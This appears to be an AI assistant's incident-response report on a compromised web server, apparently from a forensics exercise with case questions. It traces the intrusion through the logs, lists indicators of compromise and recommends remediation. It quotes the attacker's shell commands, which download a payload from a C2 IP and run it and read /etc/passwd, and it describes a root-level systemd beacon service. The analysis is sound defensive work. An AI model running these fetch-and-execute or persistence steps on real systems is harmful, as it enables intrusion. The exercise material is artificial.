All claims accepted. Here is the final report.

---

# Incident Response Report — webserver-prod-02

## Executive Summary

The host **webserver-prod-02** was compromised. The attacker gained initial access as the `www-data` user (likely via a web application vulnerability), downloaded and executed a payload from a known C2 server, then pivoted to the `deploy` account via a compromised SSH key. Using `deploy`'s NOPASSWD sudo access to `systemctl`, the attacker installed a persistent C2 beacon as a systemd service running as root.

## Attack Timeline

| Time (UTC) | Event | Source |
|---|---|---|
| *Unknown* | Attacker obtains shell as `www-data`, runs recon (`id`, `uname -a`), downloads payload from `http://185.229.59.103/u`, executes `/tmp/.u` | `fs/var/www/.bash_history:1-7` |
| Apr 14 03:17:44 | `deploy` logs in via SSH publickey from **185.229.59.103** (C2 IP) | `auth.log:30` |
| Apr 14 03:18:02 | `deploy` runs `sudo cat /etc/passwd` (recon) | `auth.log:32` |
| Apr 14 03:18:12 | `deploy` copies `/tmp/update` to `/usr/local/bin/update` | `auth.log:35` |
| Apr 14 03:18:17 | `deploy` makes `/usr/local/bin/update` executable | `auth.log:36` |
| Apr 14 03:18:29 | `deploy` writes `system-updater.service` via `sudo tee` | `auth.log:37` |
| Apr 14 03:18:44 | `deploy` runs `sudo systemctl daemon-reload` | `auth.log:38` |
| Apr 14 03:18:58 | `deploy` enables `system-updater.service` for persistence | `auth.log:39` |
| Apr 14 03:19:03 | `deploy` starts `system-updater.service` — C2 beacon now active | `auth.log:40` |

## Confirmed Findings

1. **Malicious systemd persistence** (CONFIRMED): `etc/systemd/system/system-updater.service` runs as root and POSTs hostname/IP to `https://185.229.59.103:8443/beacon` every 600 seconds.
2. **Sudo abuse — service installation** (CONFIRMED): The `deploy` user wrote the malicious service file via `sudo tee` at `auth.log:37`.
3. **Sudo abuse — credential access** (CONFIRMED): The `deploy` user read `/etc/passwd` via `sudo cat` at `auth.log:32`.
4. **C2 IP confirmed malicious** (CONFIRMED): `185.229.59.103` is a known C2 server per threat intelligence (tags: c2, beacon; confidence: high).

## Inferences

- **Initial access via www-data**: The shell history at `/var/www/.bash_history` shows the attacker ran recon and downloaded a payload from the same C2 IP. This likely occurred through a web application vulnerability.
- **Compromised SSH key**: The `deploy` account logged in via publickey from `185.229.59.103`. All legitimate `deploy` logins came from `10.0.1.50` (CI runner). The attacker likely exfiltrated deploy's private key during the www-data phase.
- **History cleaning/evasion**: The malicious sudo commands (auth.log lines 32-40) do not appear in `deploy`'s `.bash_history`, which contains only benign CI/CD commands. The attacker either cleaned the history or used a non-interactive SSH session.
- **Privilege escalation via sudoers misconfiguration**: `deploy` has `NOPASSWD` access to bare `/usr/bin/systemctl`, which allowed the attacker to install and enable a root-level service without any password prompt.

## Shell History Analysis

| Account | History File | Size | Commands | Findings |
|---|---|---|---|---|
| **root** | `fs/root/.bash_history` | 80 bytes | 4 | Benign admin commands (`apt update`, `apt upgrade`, `systemctl restart nginx`, `tail -f` logs). No suspicious activity. |
| **deploy** | `fs/home/deploy/.bash_history` | 264 bytes | 15 | Normal CI/CD operations (git, npm, docker, curl to npmjs.org). Notably **missing** the malicious sudo commands seen in auth.log. |
| **alice** | `fs/home/alice/.bash_history` | 123 bytes | 6 | Benign log review (`ls`, `cd /var/log`, `tail nginx access.log`, `journalctl`, `systemctl status nginx`). No suspicious activity. |
| **www-data** | `fs/var/www/.bash_history` | 103 bytes | 7 | **Attacker activity**: `id`, `uname -a`, `cd /tmp`, `wget http://185.229.59.103/u -O /tmp/.u`, `chmod +x /tmp/.u`, `/tmp/.u &`, `cat /etc/passwd`. |
| **bob** | *(no history file found)* | — | — | Bob has an account (UID 1003) and 2 successful SSH logins in auth.log, but no `.bash_history` exists in the filesystem snapshot. |

## IOCs

| Type | Value | Context |
|---|---|---|
| IP | `185.229.59.103` | C2 server — login source, payload host, beacon destination |
| URL | `http://185.229.59.103/u` | Payload download URL (www-data history) |
| URL | `https://185.229.59.103:8443/beacon` | C2 beacon endpoint (systemd service) |
| File path | `/usr/local/bin/update` | Dropped binary (copied from `/tmp/update`) |
| File path | `/tmp/.u` | Downloaded payload (hidden file) |
| Service | `system-updater.service` | Persistence mechanism |

## Recommendations

1. **Immediately** disable and remove `system-updater.service`; kill any running curl beacon processes.
2. Revoke and rotate the `deploy` account's SSH keys.
3. Investigate the web application for the vulnerability that gave the attacker a www-data shell.
4. Remove `/usr/local/bin/update` and investigate its contents (hash and submit to malware analysis).
5. Restrict `deploy`'s sudo access — replace bare `systemctl` with specific subcommand allowlists (e.g., `/usr/bin/systemctl restart nginx`).
6. Audit all accounts for unauthorized SSH keys.

---

## Case Questions

**Case Q1:** I analyzed the shell histories of four accounts: **root** (`fs/root/.bash_history`, 4 commands), **deploy** (`fs/home/deploy/.bash_history`, 15 commands), **alice** (`fs/home/alice/.bash_history`, 6 commands), and **www-data** (`fs/var/www/.bash_history`, 7 commands). A fifth account, **bob**, had no shell history file present in the filesystem snapshot despite having two recorded SSH logins.

**Case Q2:** Yes — the **www-data** account's shell history (`fs/var/www/.bash_history`) shows what the attacker did during the initial compromise phase: ran reconnaissance (`id`, `uname -a`), downloaded a payload from the C2 server (`wget http://185.229.59.103/u -O /tmp/.u`), made it executable (`chmod +x /tmp/.u`), executed it in the background (`/tmp/.u &`), and read `/etc/passwd` (`cat /etc/passwd`). The attacker's subsequent actions as the **deploy** user (SSH login from C2 IP, installing a persistent C2 beacon service) are visible only in `auth.log` sudo entries — deploy's own `.bash_history` does not contain these commands, indicating history evasion.